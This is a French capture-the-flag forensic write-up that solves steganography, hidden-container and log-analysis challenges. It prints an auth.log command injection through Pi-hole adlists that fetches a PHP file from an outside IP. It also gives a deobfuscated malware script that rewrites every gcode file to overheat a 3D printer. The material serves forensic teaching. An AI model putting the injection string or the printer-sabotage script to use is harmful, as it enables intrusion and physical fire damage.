Kc2 1124. Kb6 Kb3 1125. Ka6 Ka3 1126. Ka5 Kb3 1127. Ka6 Kc4 1128. Ka5 Kc5 1129. Ka4 Kd5 1130. Ka5 Kc4 1131. Ka4 Kd5 1132. Ka3 Kd6 { White resigns. } 0-1 Je d\u00e9cide d'effectuer quelques recherches sur ce format. Je tombe sur le d\u00e9pot github d'un certain \"jes\" https://github.com/jes/chess-steg qui a d\u00e9velopp\u00e9 un outil pour encoder/d\u00e9coder du texte au format pgn. Il met en plus \u00e0 disposition un outil en ligne : https://incoherency.co.uk/chess-steg/ Et cette fois ci, la piste de recherche prend tout son sens : On d\u00e9couvre une conversation entre \"Drewski\" et \"Yuri\". Drewski semble vouloir acheter quelques choses \u00e0 Yuri \u00e0 travers des cryptomonnaies, Drewski proc\u00e8de \u00e0 un paiement, et Yuri lui envoie un fichier \"stl\". Mais quelque chose se passe mal... car Yuri veut dans ses derniers messages, tuer Drewski. Drewski serait-il le maker mort dans l'incendie ? En attendant, j'ai mon 2\u00e8me flag : ECW{6d064b364f2a315c32fd25184256c1278b12ee73} + 50 points","title":"Lord of War 2/4"},{"location":"ctf/ecw2020/forensicqualification/#lord-of-war-34","text":"Piste de recherche : 2eme flag.txt Pour cette 3\u00e8me \u00e9tape, nous recherchons un deuxi\u00e8me fichier flag.txt sur l'image disque de la cl\u00e9 usb. Ce fichier est peut-\u00eatre cach\u00e9 dans les 2 fichiers pdf restant, o\u00f9 dans les 2 vid\u00e9os. Je remarque un d\u00e9tail important concernant les deux vid\u00e9os, elles font la m\u00eame dur\u00e9e, mais la vid\u00e9o VOST \u00e0 une taille pratiquement deux fois plus grandes que l'autre. onosh@siftworkstation:# ls -l |grep 'mp4' -rwxrwxrwx 1 onosh onosh 7858017 Oct 15 23:09 MrNigloR-S01-ep1.mp4 -rwxrwxrwx 1 onosh onosh 18215861 Oct 17 12:18 MrNigloR-S01-ep1-VOST.mp4 On pourrait penser que les sous-titres sont la cause de cette diff\u00e9rence de taille... je d\u00e9cide de les analyser ! onosh@siftworkstation:# du -h *mp4 7.5M MrNigloR-S01-ep1.mp4 18M MrNigloR-S01-ep1-VOST.mp4 La vid\u00e9o est l'\u00e9pisode 1 de la saison 1 de la s\u00e9rie Mister Robot. Un d\u00e9tail m'interpelle, certaines lettres dans les sous titres sont \u00e9crites en italiques : J'extrait les sous-titres de la vid\u00e9o avec l'outil ffmpeg : onosh@siftworkstation:# cat MrNigloR-S01-ep1-VOST_3_text.srt 1 00:00:00,700 --> 00:00:03,700 What is it about society that d<i>i</i>sappoints you so much? 2 00:00:11,000 --> 00:00:12,600 Oh, I <i>d</i>on't know. 3 00:00:13,200 --> 00:00:16,080 Is it that we collectively thought Steve J<i>o</i>bs 4 00:00:16,080 --> 00:00:18,000 Was a great man, even whe<i>n</i> we knew 5 00:00:18,000 --> 00:00:21,000 He made billions off <i>t</i>he backs of children? 6 00:00:23,000 --> 00:00:26,500 Or maybe it's that it feels l<i>i</i>ke all our heroes are counterfeit. 7 00:00:27,300 --> 00:00:30,000 The world itself's just one bi<i>g</i> hoax. 8 00:00:31,000 --> 00:00:34,300 Spamming with our run<i>n</i>ing commentary of bullshit 9 00:00:34,300 --> 00:00:39,100 masquerading as insight, <i>o</i>ur social media faking as intimacy. 10 00:00:41,000 --> 00:00:43,500 Or is it that we voted fo<i>r</i> this? 11 00:00:43,550 --> 00:00:43,550 scC<=:7b:?rCJAE$Ac4b 12 00:00:44,000 --> 00:00:46,000 Not with our rigged <i>e</i>lections, but with our things, 13 00:00:46,000 --> 00:00:47,700 our propert<i>y</i>, our money. 14 00:00:48,510 --> 00:00:51,100 I'm n<i>o</i>t saying anything new. We all know why we do this, 15 00:00:51,100 --> 00:00:53,200 not because H<i>u</i>nger Games books makes us happy 16 00:00:54,100 --> 00:00:55,800 but because we wanna <i>b</i>e sedated. 17 00:00:56,000 --> 00:00:58,600 Because it's painful n<i>o</i>t to pretend, 18 00:00:58,600 --> 00:01:00,000 <i>b</i>ecause we're cowards. 19 00:01:01,090 --> 00:01:03,100 Fuck societ<i>y.</i> On retrouve les caract\u00e8res en italiques encadr\u00e9 par les balises <i></i> . En les r\u00e9cup\u00e9rant un \u00e0 un, on obtient idontignoreyouboby. onosh@siftworkstation:# cat MrNigloR-S01-ep1-VOST_3_text.srt |grep '<i>' |cut -d\">\" -f2 |cut -d\"<\" -f1 |tr -d '\\n' idontignoreyouboby. Autre d\u00e9tail, je remarque dans les sous-titres la cha\u00eene scC<=:7b:?rCJAE$Ac4b mais elle semble \u00eatre chiffr\u00e9. L'un des PDF (Wiki.pdf) disponible sur la cl\u00e9 usb, on nous donne des informations sur le ROT13, une technique de chiffrement par d\u00e9calage : Vu l'alphabet utilis\u00e9 pour cette cha\u00eene chiffr\u00e9, le ROT13 n'est pas adapt\u00e9. En revanche le ROT47 oui, car il prend en charge les caract\u00e8res sp\u00e9ciaux, j'obtiens une cl\u00e9 : D4rklif3inCryptSp4c3 Maintenant, j'ai deux cl\u00e9s potentiels, mais je ne sais pas quoi en faire ! Apr\u00e8s quelques recherches par mots cl\u00e9s sur google, je trouve mon bonheur, un article de Korben qui semble int\u00e9ressant : Cacher un conteneur TrueCrypt dans une vid\u00e9o Que dit l'article : Martin Fiedler, un allemand portant le pseudo KeyJ a mis en ligne sur son blog, une m\u00e9thode permettant d\u2019int\u00e9grer dans une vid\u00e9o MP4, un conteneur TrueCrypt... Avant de commencer, il faut trouver un MP4 ou un MOV qui soit cr\u00e9dible pour le transport. C\u2019est \u00e0 dire un film qui soit suffisamment bien encod\u00e9 et de bonne qualit\u00e9, pour qu\u2019une augmentation de sa taille n\u2019\u00e9veille pas les soup\u00e7ons. Une s\u00e9rie de 500 Mo que vous ferez grimper \u00e0 700 Mo pourra faire l\u2019affaire si la qualit\u00e9 est au rendez-vous. Comment cela fonctionne ? Plus de d\u00e9tails Et si nous avions un container chiffr\u00e9 dans notre vid\u00e9o ? Cela expliquerai sa taille importante et l'existance des cl\u00e9s pour le d\u00e9chiffrer ! onosh@siftworkstation -> /tmp # mkdir /mnt/veracrypt onosh@siftworkstation -> /tmp # veracrypt -t MrNigloR-S01-ep1-VOST.mp4 /mnt/veracrypt/ Enter password for /tmp/MrNigloR-S01-ep1-VOST.mp4: Enter PIM for /tmp/MrNigloR-S01-ep1-VOST.mp4: Enter keyfile [none]: Protect hidden volume (if any)? (y=Yes/n=No) [No]: onosh@siftworkstation -> /tmp # ls -l /mnt/veracrypt/ total 5502 -rwx------ 1 root root 4106658 oct. 23 2019 Brandalism.pdf -rwx------ 1 root root 46 juil. 2 08:55 Flag.txt -rwx------ 1 root root 1521110 juil. 2 09:29 Liberator.gcode -rwx------ 1 root root 3150 juil. 2 08:43 xbdk.kdbx 3\u00e8me mission r\u00e9ussie ! le flag est \u00e0 nous : ECW{40474cc4ffb7874ebab39da9d1a16caaa9f06b07} + 100 points","title":"Lord of War 3/4"},{"location":"ctf/ecw2020/forensicqualification/#lord-of-war-44","text":"Pour ce dernier challenge, il n'y a pas de piste de recherche. Le container veracrypt contenait 3 autres fichiers : Un fichier pdf Un fichier gcode Un fichier kdbx onosh@siftworkstation -> /tmp # ls -l /mnt/veracrypt/ total 5502 -rwx------ 1 root root 4106658 oct. 23 2019 Brandalism.pdf -rwx------ 1 root root 46 juil. 2 08:55 Flag.txt -rwx------ 1 root root 1521110 juil. 2 09:29 Liberator.gcode -rwx------ 1 root root 3150 juil. 2 08:43 xbdk.kdbx Le fichier Brandalism.pdf n'est pas int\u00e9ressant car il est identique \u00e0 celui mis \u00e0 disposition par l'entreprise Brandalism sur internet (sha256sum identique). Le fichier Liberator.gcode semble int\u00e9ressant, car le \"gcode\" est un langage pour donner des instructions \u00e0 une imprimante 3D. Mais ce fichier ne cache aucun secret, \u00e0 part le logo des organisateurs du CTF. Le dernier fichier est un keepass, j'essaye de l'ouvrir avec la cl\u00e9 r\u00e9cup\u00e9r\u00e9 pr\u00e9c\u00e9demment idontignoreyouboby : Et \u00e7a marche, le flag de cette derni\u00e8re \u00e9tape de la premi\u00e8re partie \u00e9tait cach\u00e9 ici ! ECW{9dc2896d55b56eb19f59d544383f832644381817} + 100 points","title":"Lord of War 4/4"},{"location":"ctf/ecw2020/forensicqualification/#partie-ii","text":"Cette deuxi\u00e8me partie est constitu\u00e9e de 3 \u00e9tapes et l'analyse se concentre sur l'image disque du rapsberry, c'est \u00e0 dire le fichier Raw2.dd","title":"Partie II"},{"location":"ctf/ecw2020/forensicqualification/#burn-after-reading-13","text":"On nous donne les informations suivantes : Suite de l'enqu\u00eate sur le maker d\u00e9c\u00e9d\u00e9 dans des conditions suspicieuses... Une piste de recherche : Point d'entr\u00e9e Ici, on doit chercher une trace, qui montrerait le point d'entr\u00e9e de l'attaquant. Et pour trouver une trace, on vise automatiquement les logs. Malheuresement, cette image disque du raspberry est chiffr\u00e9 avec Luks ! mais heureusement, le maker a enregistr\u00e9 la cl\u00e9 de d\u00e9chiffrement dans le fichier keepass : Il suffit de monter la partition chiffr\u00e9e avec la cl\u00e9 \"3DPiting\" : onosh@siftworkstation -> /tmp # cryptsetup luksOpen lapartitionluks.dd BRIOCHE Enter passphrase for lapartitionluks.dd: onosh@siftworkstation -> /tmp # mount -r /dev/mapper/BRIOCHE /mnt/lulu/ onosh@siftworkstation -> /tmp # ls -l /mnt/lulu/ total 88 drwxr-xr-x 2 root root 4096 mai 27 07:11 bin drwxr-xr-x 2 root root 4096 mai 27 07:24 boot drwxr-xr-x 4 root root 4096 mai 27 07:05 dev drwxr-xr-x 87 root root 4096 juil. 9 12:20 etc drwxr-xr-x 3 root root 4096 mai 27 07:10 home drwxr-xr-x 17 root root 4096 juil. 9 10:00 lib drwx------ 2 root root 16384 mai 27 07:24 lost+found drwxr-xr-x 2 root root 4096 mai 27 07:05 media drwxr-xr-x 2 root root 4096 mai 27 07:05 mnt drwxr-xr-x 4 root root 4096 juil. 9 09:42 opt drwxr-xr-x 2 root root 4096 mai 10 20:59 proc drwx------ 3 root root 4096 janv. 1 1970 root drwxr-xr-x 4 root root 4096 mai 27 07:05 run drwxr-xr-x 2 root root 4096 juil. 9 10:00 sbin drwxr-xr-x 2 root root 4096 mai 27 07:05 srv drwxr-xr-x 2 root root 4096 mai 10 20:59 sys drwxrwxrwt 7 root root 4096 juil. 9 16:54 tmp drwxr-xr-x 10 root root 4096 mai 27 07:05 usr drwxr-xr-x 12 root root 4096 juil. 9 09:34 var On a d\u00e9sormais acc\u00e8s au raspberry. Comme dit ci-dessus, nous recherchons une \"trace\", quoi de mieux que les logs pour trouver cela ? onosh@siftworkstation -> /m/lulu/ # ls -lart var/log/ total 18580 -rw-r--r-- 1 root root 0 mai 27 07:24 bootstrap.log drwx------ 2 root root 4096 mai 27 07:24 private -rw-r----- 1 root adm 211062 juil. 9 09:21 syslog.1 -rw-rw---- 1 root utmp 384 juil. 9 09:23 btmp drwxr-xr-x 12 root root 4096 juil. 9 09:34 .. -rw-r--r-- 1 root root 1380 juil. 9 09:41 alternatives.log -rw-r--r-- 1 root root 24000 juil. 9 09:41 faillog drwxr-x--- 2 www-data www-data 4096 juil. 9 09:42 lighttpd drwxr-xr-x 2 vboxadd 995 4096 juil. 9 09:43 pihole drwxr-xr-x 6 root root 4096 juil. 9 09:43 . drwxr-xr-x 2 root root 4096 juil. 9 10:48 apt -rw-r--r-- 1 root root 55060 juil. 9 10:52 dpkg.log -rw-r----- 1 root adm 2600 juil. 9 12:18 user.log -rw-r----- 1 root adm 16883 juil. 9 12:18 debug -rw-r----- 1 root adm 136403 juil. 9 13:22 messages -rw-rw-r-- 1 root utmp 292292 juil. 9 16:53 lastlog -rw-r----- 1 root adm 143132 juil. 9 16:53 kern.log -rw-r----- 1 root adm 96431 juil. 9 16:53 auth.log -rw-r--r-- 1 vboxadd 995 17953851 juil. 9 16:53 pihole.log -rw-r----- 1 root adm 115833 juil. 9 16:53 syslog -rw-r----- 1 root adm 168331 juil. 9 16:53 daemon.log -rw-r--r-- 1 vboxadd 995 15747 juil. 9 16:53 pihole-FTL.log -rw-rw-r-- 1 root utmp 16128 juil. 9 16:54 wtmp Nous savons que le maker est mort dans un incendie, suite \u00e0 l'attaque d'un pirate. Nous devons retrouver le point d'entr\u00e9e du pirate... le fichier auth.log semble \u00eatre l'un des plus pertinent pour lister les tentatives d'authentification. Je d\u00e9couvre des traces qui semblent malveillante vers 13:50:59 : Jul 9 10:42:22 raspberrypi usermod[11586]: add 'pihole' to group 'www-data' Jul 9 10:42:22 raspberrypi usermod[11586]: add 'pihole' to shadow group 'www-data' Jul 9 10:42:22 raspberrypi usermod[11592]: add 'www-data' to group 'pihole' Jul 9 10:42:23 raspberrypi usermod[11592]: add 'www-data' to shadow group 'pihole' Jul 9 13:50:59 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/local/bin/pihole -a adlist disable https://raw.githubusercontent.com/StevenBlack/hosts/master/hosts Jul 9 13:50:59 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/local/bin/pihole -a adlist disable https://mirror1.malwaredomains.com/files/justdomains Jul 9 13:51:00 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/local/bin/pihole -a adlist disable http://sysctl.org/cameleon/hosts Jul 9 13:51:00 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/local/bin/pihole -a adlist disable https://s3.amazonaws.com/lists.disconnect.me/simple_tracking.txt Jul 9 13:51:01 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/local/bin/pihole -a adlist disable https://s3.amazonaws.com/lists.disconnect.me/simple_ad.txt Jul 9 13:51:01 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/local/bin/pihole -a adlist disable https://hosts-file.net/ad_servers.txt Jul 9 13:51:02 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/local/bin/pihole -a adlist add http://RUNXe2VkOTM3NWYzMGJkMjIwNzdjZmRkNDk3YWU3YzJhZWYxYmI0YjgzMmZ9Cg== Jul 9 13:51:04 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/local/bin/pihole -a adlist disable http://RUNXe2VkOTM3NWYzMGJkMjIwNzdjZmRkNDk3YWU3YzJhZWYxYmI0YjgzMmZ9Cg== Jul 9 13:51:04 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/local/bin/pihole -a adlist add http://2.57.116.54# -o fun.php -d Jul 9 13:51:06 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin/scripts/pi-hole/php ; USER=root ; COMMAND=/usr/local/bin/pihole -g Jul 9 13:51:30 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin/scripts/pi-hole/php ; USER=root ; COMMAND=/usr/local/bin/pihole -g Jul 9 13:51:53 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/local/bin/pihole -a adlist disable http://2.57.116.54# -o fun.php -d Jul 9 13:51:53 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin ; USER=root ; COMMAND=/usr/local/bin/pihole -a adlist add http://2.57.116.54# -o teleporter.php -d Jul 9 13:51:55 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin/scripts/pi-hole/php ; USER=root ; COMMAND=/usr/local/bin/pihole -g Jul 9 13:52:17 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin/scripts/pi-hole/php ; USER=root ; COMMAND=/usr/local/bin/pihole -g Jul 9 13:52:38 raspberrypi sudo: www-data : TTY=unknown ; PWD=/var/www/html/admin/scripts/pi-hole/php ; USER=root ; COMMAND=/usr/local/bin/pihole -a -t L'utilisateur de \"pihole\", un outil pour bloquer les publicit\u00e9s, \u00e0 supprimer et ajouter des noms de domaines aux listes de blocage de pihole. Un nom de domaine est particulier : http://RUNXe2VkOTM3NWYzMGJkMjIwNzdjZmRkNDk3YWU3YzJhZWYxYmI0YjgzMmZ9Cg== Il s'agit d'une chaine encod\u00e9 en base64, et si on l'a d\u00e9code : onosh@siftworkstation -> /m/lulu/ # echo \"RUNXe2VkOTM3NWYzMGJkMjIwNzdjZmRkNDk3YWU3YzJhZWYxYmI0YjgzMmZ9Cg==\" |base64 -d ECW{ed9375f30bd22077cfdd497ae7c2aef1bb4b832f} Nous avons notre flag : ECW{ed9375f30bd22077cfdd497ae7c2aef1bb4b832f} + 50 points","title":"Burn After Reading 1/3"},{"location":"ctf/ecw2020/forensicqualification/#burn-after-reading-23","text":"Piste de recherche : Fichiers Cibl\u00e9s Rappelons nous, Yuri, le pirate avait envoy\u00e9 un fichier \"STL\", ce fichier est utilis\u00e9 par les imprimantes 3D. Je d\u00e9cide d'analyser les fichiers que l'imprimante du maker \u00e0 utilis\u00e9. La solution \"octoprint\" est install\u00e9 sur le raspberry, cette solution permet de contr\u00f4ler les op\u00e9rations d'une imprimante 3D. Les fichiers imprim\u00e9s par l'imprimante sont stock\u00e9s dans le r\u00e9pertoire uploads/ onosh@siftworkstation -> /m/lulu/ # ls -lart home/pi/.octoprint/uploads/ total 62316 -rw------- 1 bsi bsi 1310133 juil. 9 13:03 CE3PRO_Table_Hanger.gcode -rw------- 1 bsi bsi 1561146 juil. 9 13:03 Liberator.gcode -rw------- 1 bsi bsi 41533989 juil. 9 13:03 CE3PRO_corona.gcode -rw------- 1 bsi bsi 3434681 juil. 9 13:03 CE3PRO_unbelievable.gcode -rw------- 1 bsi bsi 1099516 juil. 9 13:03 CE3PRO_MIG-29_kit.gcode -rw------- 1 bsi bsi 14846427 juil. 9 13:04 CE3PRO_Naomi__Wu.gcode On d\u00e9couvre 6 fichiers, ouvrons les tous ! CE3PRO_Table_Hanger.gcode CE3PRO_corona.gcode CE3PRO_MIG-29_kit.gcode CE3PRO_Naomi__Wu.gcode CE3PRO_unbelievable.gcode Cool, on a notre flag ! ECW{f79d8842c644881ddf017e0928e87710c0a15d84} + 50 points","title":"Burn After Reading 2/3"},{"location":"ctf/ecw2020/forensicqualification/#burn-after-reading-33","text":"Piste de recherche : Le virus Pour cette derni\u00e8re et ultime \u00e9tape, nous devons retrouver le virus qui a tu\u00e9 le maker (non ce n'est pas le corona virus) On imagine qu'il y a une action sur l'imprimante pour que celle-ci prennent feu, et tue Drewski... Le meilleur moyen de retrouver ce \"virus\", est de tracer une timeline des \u00e9v\u00e9nement, le dernier jour ou le raspberry a fonctionn\u00e9. Actuellement, le seul \u00e9lement malveillant que nous avons, est le nom de domaine louche, ajout\u00e9 par le pirate \u00e0 travers pihole. La photo en plus grand L'ensemble de l'attaque est maintenant trac\u00e9e, un \u00e9l\u00e9ment est particuli\u00e8rement \u00e9trange... il s'agit du script basic-install.sh . C'est le premier \u00e9l\u00e9ment louche \u00e0 \u00eatre pr\u00e9sent sur le raspberry, d'une part par son horaire de cr\u00e9ation sur le serveur et d'autre part par son contenu. Voici un \u00e9chantillon de ce qu'il contient : #!/bin/bash ${*^^} \"${@}\"ba\"${@%4GJp}\"s'h' ${*%%x\\{&|q\\]l} \"${@/\\(mL\\'U./>l\\\"rs}\" <<< \"$( \"${@//F\\[sym/8%wS;k43}\" $'\\x70'rin''t'f' \"\\x$( ${@,} \\p\\ri\"\"\\nt''$'\\u0066' %s ';6Jb+l<2' \"${@##=#BHH}\" ${*~} | \"${@//x$Rdu;gr/VQos\\!yS}\" ${*,,} 'm'$'\\1445''s'$'\\u0075'm \"${@~}\" | $* ${*} $'\\x63'\"${@#T%EP#}\"u${*^}t -b $[ ((-56\"#\"k+-\"6\"1\"#\"\"$@\"e)+22#2\"7\") ]-$[ ((15#\"0\"+-3#\"${@/07Ueg+,@/d\\!Fm%}\"1\"${@/t9u&17#/h\\)V#wqQf}\"1)+5${*^^}3\"${@//Md=.RU</2=*P8o%v}\"#${@%%ecrN}m) ] ${*##nN2Wv} ${*,,} )\" ${@,} ; ${*//z\\}BWp+:} ${*//oxQaU2} pr\\in\\t''f \"\\x$( ${*//?I2jQpv} $'\\160\\x72'\"\"${*~}i$'\\x6e'\"t\"\"f\" %s 'dy52hd]8' ${*^} ${@#$&2\\)-=*#} | ${*,,} m''d5''$'\\u0073'um \"${@^}\" | \"${@/a0^SL,,}\" ${*~} cut -b $(( ((${!*}-53#a+4#\"${@/1Cg\\!JLUk}\"11)+57#k) ))-$[ ((-6\"# Le script bash semble avoir \u00e9t\u00e9 obfusqu\u00e9 avec Bashfuscator, malheuresement pour nous, il n'existe pas de d\u00e9sobfuscateur\u2026 Apr\u00e8s avoir sandboxer ce petit script, qui peut-\u00eatre contient un virus, je l'\u00e9x\u00e9cute pour voir ce qu'il me donne. Quelques secondes d'attente, et le code source d'une page web s'affiche, la page youtube d'un clip de Kenji Girac... Cela ne nous avance pas beaucoup... Analysons la structure du fichier : Il contient \u00e9norm\u00e9ment d'expression \u00e9trange comme ${@//\\{twl} Au d\u00e9but du fichier, nous avons une redirection (<<<) : ${*^^} \"${@}\"ba\"${@%4GJp}\"s'h' ${*%%x\\{&|q\\]l} \"${@/\\(mL\\`U./>l\\\"rs}\" <<< \"$( \"${@//F\\[sym/8%wS;k43}\" Ce fameux \"<<<\" permet en bash, d'afficher ou d'\u00e9x\u00e9cuter une commande en input. Que ce passe t'il si je remplace ${*^^} \"${@}\"ba\"${@%4GJp}\"s'h' ${*%%x\\{&|q\\]l} \"${@/\\(mL\\`U./>l\\\"rs}\" par un simple cat pour afficher la commande lanc\u00e9e... onosh@a154po4d2:/tmp# ./basic-install.sh curl 'https://www.youtube.com/watch?v=63K5VMx2BZM' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: VISITOR_INFO1_LIVE=fiPetRZgDXQ; YSC=JleF1aORUEc; GPS=1; CONSENT=WP.288b95' -H 'Upgrade-Insecure-Requests: 1' -H 'TE: Trailers' La commande curl qui r\u00e9cup\u00e8re la page youtube du clip de Kenji s'affiche, cool ! Le fichier cache peut \u00eatre une aute occurence de cette fameuse redirection \"<<<\" Je trouve une deuxi\u00e8me redirection identique ! Le fichier utilise un OU pour lancer deux commandes : bash <<< printf $(...) || bash <<< printf $(...) Je n'ai plus qu\u2019\u00e0 r\u00e9cup\u00e9rer la deuxi\u00e8me commande... M\u00eame op\u00e9ration que toute \u00e0 l'heure, j'ajoute cat devant le deuxi\u00e8me \"<<<\" : #ECW{7aaceb8d3e60402d94079707d2430c7394d916eb} files=$(find / -type f -name \"*.gcode\" 2>/dev/null) files=$(echo $files | tr \" \" \"\\n\") for file in $files do sz=$(wc -l $file) sz=$(echo $sz | cut -d \" \" -f1) div=\"2\" med=$(expr $sz / $div) cat $file |head -n $med > temp python -c 'print \"M107\\nM190 S105\\nM190 S105\\nM109 S250\"'>>temp x=$(cat $file |head -n $med | tail -n 1 | cut -d 'X' -f2 | cut -d '.' -f1) ((x2=$x+1)) python -c 'print(\"G1 E10 F100\\nG1 X'$x'\\nG1 E10 F100\\nG1 X'$x2'\\n\")*1000' >> temp cat $file |tail -n $med >> temp cat temp > $file rm temp done Nous avons notre dernier flag ! ECW{7aaceb8d3e60402d94079707d2430c7394d916eb} + 100 points Quel \u00e9tait l'objectif de ce virus ? Trouver tous les fichiers gcode pr\u00e9sent sur le raspberry Pour chaque fichier trouv\u00e9 : Il injecte une commande invalide \u00e0 la fin du fichier Un grand nombre de commandes invalides a peut-\u00eatre fait bruler l'imprimante !","title":"Burn After Reading 3/3"},{"location":"ctf/esnhack2020/exfiltration1/","text":"EXFILTRATION 1 \u00c9nonc\u00e9 Lors de l'intrusion, un hacker de l'ESNA a d\u00e9cid\u00e9 d'exfiltrer de la data du serveur. Cette fois-ci, il a \u00e9t\u00e9 plus ing\u00e9nieux et a d\u00e9cid\u00e9 de brouiller les pistes. A vous de jouer ! Cr\u00e9ateur du challenge : Cabir Analyse du trafic En ouvrant la capture avec Wireshark, on remarque qu'il y a un fort trafic http : En suivant le flux tcp 2, on observe la requ\u00eate http suivante : GET / HTTP/1.1 Host: 0.0.0.0:2000 User-Agent: python-requests/2.22.0 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Length: 1 EHTTP/1.0 200 OK Server: SimpleHTTP/0.6 Python/3.6.9 Date: Thu, 23 Apr 2020 22:59:27 GMT Content-type: text/html; charset=utf-8 Content-Length: 559 <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\"> <html> <head> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"> <title>Directory listing for /</title> </head> <body> <h1>Directory listing for /</h1> <hr> <ul> <li><a href=\"Bigtits-russia\">Bigtits-russia</a></li> <li><a href=\"comment_perdre_son_gland_de_lait\">comment_perdre_son_gland_de_lait</a></li> <li><a href=\"free_pornhub_account\">free_pornhub_account</a></li> <li><a href=\"How_to_hack_CIA\">How_to_hack_CIA</a></li> </ul> <hr> </body> </html> En analysant plus profond\u00e9ment la requ\u00eate GET, on remarque un transfert de data : Plus largement, les requ\u00eates HTTP GET sont envoy\u00e9s vers 4 ports principaux, 2000,3000,4000 et 5000 sans vraiment de distinctions possibles. R\u00e9cup\u00e9ration des donn\u00e9es Je d\u00e9cide donc de commencer par r\u00e9cup\u00e9rer les donn\u00e9es qui circulent sur les \u00e9changes \u00e0 destination du port 2000. onosh@kali:/mnt/v# tshark -r exfiltration1.pcapng -Y 'http.request.method == \"GET\" && tcp.port eq 2000' -T fields -e http.file_data |tr -d '\\n' ESNHACK{ixzc9GadiiTDzlZvPimzd9CBQDK9GToTDTnNJGErAIJ7lg6QgkLsSrkTmVgoGlU3xzXU2JYM8HewgagbVKMbdk2gRf0qI08p0JN3fvmb2LSarum7vD78plL81GJ9IZrDMUoeB9dKsB6xAblomhDbAzr0mR4QypRkSNKldaW3lebS4dHoCt2QAneGLWg5VycgZi7BRq3PpLW4mDWX4O0SgtjYsaOEUE7oosLbheYTdLjZ6sNaT2hwJ6JqHGruQmIlPB91QvF5spDD8ubRewCfUQqeaFAJWD0grj259ZvrRhw79HhTr1uzRjl5BWI3asbIF1rV1C3jVk1Q3xUBGSKDR3QXFzc5Gx5CjXFfd6qQD64HpiukmNwBDhIi6O96y8XZZvyV65NZhILLfkk1o5HojrCkmcOTO84VVORJaxKGITOWPokOxICzjgCTwxcsVTLkPL4tgV43wwLoUODHOD0dgRUysj9wzvkbTaYhFpZMDmFMN2q8cgvoS8R1MHNH4xMnUHgD0IqSauSaCKnsc8w5fsa5RdCUAmsSDeEQQdacQKpOixC03B8Oh9f0AElq0yikBOfu5wD4X705rLDgVPhAYfjOPOb53JmQGhTTenmFrSUrc68NhrvqCDZFHdLkXiFrJL54e0fj9bsdYfNz3qrZEXysWkIAAjrLBVqb90qvE7cuwAoEy7XSbEUszLKI8EhGGVhJ7hXO9ZyuHw6c5FgRalGTANObBKoDAlYlDH18LdbfnJ51T8IghoqSWuu38vElvzMA9DE0PHFueMY3YdbdKKcbrKI1kSUWTP37ezNpJfCKZ5KySf9hpkJ0MQApyoEXMYCx0w0vigN345BlNp3f5d7cSytDlZAX5MNHDmnK3locztIQj7mILBe37QVVHyKnxoWsHiun8dtCc2rVN3igLKccajzM811yeUGCrVzfYauhs0OHeh93uIm5E07WLn3WbctWqx5comdi4JqkeTRCmhyjLrsYAQh7fyQeGj2ZGbmcupqHv2BtuFvHon2DYNwjkNNLOPdw4PdfyOO06LCZaixMsruRNjavvmsqpiz9VFbvQ1CqPU9WspwZWHm4xkWiblnqdWadkQem2Rhx9G5nqKdytwXvb9ujh8KzGxAi6GDTgeEsAX4FeX0sQrYrqL5Eh4DVYmoU4NFqudS7MeKEwvV4keQnDxEm15MeLGJlkAxLDQvJq88WDdIKMSS7Z4dY15xBQ5QpjV2avKfY4kbZ0SXXox3JaS31ymSfpwWdVOxL6K4QJJiCHPUjmoaxiO5QtvSjqnyHOOWUeorOS8zqJEmcipK2zZRTFxUj6XTbOghrgWt9JEG9lQp6esK0TUl1pvZsHyyPqea70Ajvfy3z8M30gWpr8Pb8ZQPd5HRUsRM4js0sXuAhu81j1Y79WfTn7bDRatTut2H1Y9kIPCUWU7TxX1XI2V6C5d1ALTjzqsA1o5hQATCPot4zvJU4dPPnwJMbjE5eMMK4jXdjk6WqJL3tNIdSuDR4uS6RyaOVIwV4g77SEnY44Pkbe7W36QGG6BvQhcpsI3Uy85cslrwNdTDtKSO5zn1jVKU7DJFoyEaVFRgOGH9QZpO7hdEteMviPOjzRrxIbtGACOrcGXl1QZUnzzinjaKgAUASQKoUflPedoVzEp00uferQx8iPGdckRU2d4gVF5FLAO6amN0Ls82uDpOLOxTNhCHawoYd3I2qQkoEnYvvyX1qOr2UKbSdGlpckD3FfEg9oiYPo2H4ym2HwLsm1LE8lNL28UyNEKBMuEfRIJmQLAWawu5u1Jw6qvbUqKLSgXAHbsOrMQCMnzGoIcmi1qgMUUbQaFZ0LV582zZFWdBMkAntjnHk68ud5zDgSSOoFyFubsT0AhWCHNT0pfoZPGBJK1pO514VwgQNuIbIiA9odSNWsJBrSjD1NvtwUisMNAVhyJq09fWeATz9P3yfPqW18EFl7Mr1Si4y5uxliD7th